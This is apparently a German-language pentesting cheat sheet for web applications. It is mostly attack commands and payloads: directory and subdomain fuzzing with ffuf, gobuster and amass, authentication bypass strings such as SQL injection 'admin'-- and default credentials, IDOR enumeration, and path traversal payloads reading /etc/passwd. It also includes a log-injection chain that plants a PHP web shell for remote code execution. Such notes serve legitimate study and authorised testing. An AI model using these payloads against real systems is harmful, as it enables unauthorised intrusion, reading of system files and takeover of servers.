ffuf -w /usr/share/wordlists/dirb/common.txt -u http://target/FUZZ -t 50 -e .php,.txt,.bak

gobuster dir -u http://target -w wordlist.txt -x php,html,txt -t 30

dirsearch -u http://target -e php,asp -x 403,404

- Achte auf .bak, .old, .zip, .swp, .git/, .env, backup/
- Oft kombiniert mit robots.txt, sitemap.xml, /.git/config


**Subdomain Enum**

sublist3r -d example.com

assetfinder --subs-only example.com

amass enum -d example.com

ffuf -w subdomains.txt -u http://FUZZ.example.com


- Prüfe auf *.dev, test.*, admin.*, internal.*
- SSRF, Host Header Injection oft über Subdomains möglich


**Auth Bypass**

| Methode             | Beispiel                     |
| ------------------- | ---------------------------- |
| SQLi                | `admin'--`                   |
| Logikfehler         | Eingeloggt ohne Session?     |
| Default Creds       | `admin:admin`, `test:test`   |
| Header Manipulation | `X-Forwarded-For: 127.0.0.1` |
| URL Manipulation    | `?user=admin`                |

- Burp Repeater
- hydra / wfuzz (Login bruteforce)
- ffuf (Parameter Fuzzing)


**IDOR**
GET /invoice?id=12345
→ ändern zu id=12346, 12347...

- Teste mit verschiedenen Rollen/Benutzern
- user_id=
- order=
- download=
- document=
- Burp Intruder → Sequenz von IDs testen
- ffuf -w 1000-1100 -u http://target.com/profile?id=FUZZ


**File Inclusion (LFI/RFI)**
page=../../../../etc/passwd

page=php://filter/convert.base64-encode/resource=index.php

page=data:text/plain;base64,...

- wfuzz -w payloads.txt -u http://target/page=FUZZ
- RCE-Kette: LFI + Log Injection (User-Agent: <?php system($_GET['x']); ?>)
- php://input, php://filter, expect://, data://


**Road to:**
| Kategorie             | Enthält                     |
| --------------------- | --------------------------- |
| **XSS**               | Reflected, Stored, DOM      |
| **SSTI**              | Jinja2, Twig, Velocity      |
| **Command Injection** | `;`, `&&`, \`               |
| **SQLi**              | Manual, Error-Based, Blind  |
| **SSRF**              | AWS IMDS Exploits           |
| **XXE**               | XML Injection mit File Read |
